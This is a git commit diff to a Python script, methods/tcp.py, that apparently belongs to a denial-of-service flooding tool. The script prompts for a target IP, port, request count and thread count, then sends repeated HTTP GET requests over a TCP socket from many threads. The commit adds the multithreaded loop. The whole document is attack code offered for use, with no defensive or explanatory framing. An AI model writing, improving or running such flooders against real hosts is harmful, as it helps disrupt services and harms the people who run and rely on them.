859fc22cf95c9882fc56b6e206c5062c85996a82
rxyzqc <120246386+rxyzqc@users.noreply.github.com>
2022-12-30 22:30:59 +0300

    Add files via upload

--- methods/tcp.py
+++ methods/tcp.py
@@ -3,24 +3,27 @@ import socket
 
 ip = socket.gethostbyname(input("IP: "))
 port = int(input("Port: "))
+
 byte_s = int(input("Bytes: "))
+thread_s = int(input("Threads: "))
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect((ip, port))
 
 
 def tcp():
-    try:
-        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
-        sock.sendall(request)
+    for i in range(byte_s):
+        try:
+            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
+            sock.sendall(request)
 
-        print("\033[32m[+]\033[0m TCP Packet sent!")
+            print("\033[32m[+]\033[0m TCP Packet sent!")
 
-    except Exception as err:
-        print("\033[31m[-]\033[0m Connection down")
+        except Exception as err:
+            print("\033[31m[-]\033[0m Connection down")
 
 
-for i in range(byte_s):
+for i in range(thread_s):
     thread = threading.Thread(target=tcp)
     thread.start()
 
